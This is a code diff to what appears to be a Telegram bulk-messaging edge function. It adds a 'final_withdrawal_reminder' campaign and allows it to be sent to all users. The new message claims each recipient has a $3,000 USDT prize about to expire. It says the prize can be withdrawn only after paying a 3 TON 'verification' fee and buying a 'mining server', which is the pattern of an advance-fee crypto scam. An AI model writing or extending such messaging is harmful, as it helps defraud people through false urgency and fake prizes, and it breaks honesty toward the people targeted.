@@ -74,6 +74,21 @@ Requirements to withdraw:
 Don't lose your $3,000 - Complete verification now and withdraw before time runs out!
 
 Open the app and claim your prize NOW!`;
+      } else if (campaignType === 'final_withdrawal_reminder') {
+        messageText = `URGENT: ${displayName}!
+
+FINAL REMINDER - TIME IS ALMOST UP!
+
+Your $3,000 USDT reward will expire in just a few hours!
+
+To withdraw your prize:
+1. Complete wallet verification (3 TON fee)
+2. Purchase any mining server
+3. Go to Wallet and click Withdraw
+
+This is your LAST chance to claim your $3,000!
+
+Don't let it expire - Open the app NOW and withdraw!`;
       }
 
       const sent = await sendTelegramMessage(user.telegram_id, messageText);
@@ -108,7 +123,7 @@ Deno.serve(async (req) => {
     console.log(`Starting campaign: ${campaign_type}, batch: ${batch_size}, offset: ${offset}, send_all: ${send_all}`);
 
     // Handle send_all mode - runs in background
-    if (send_all && (campaign_type === 'prize_time_reminder')) {
+    if (send_all && (campaign_type === 'prize_time_reminder' || campaign_type === 'final_withdrawal_reminder')) {
       // Start background task
       EdgeRuntime.waitUntil(sendToAllUsers(supabase, campaign_type));
       
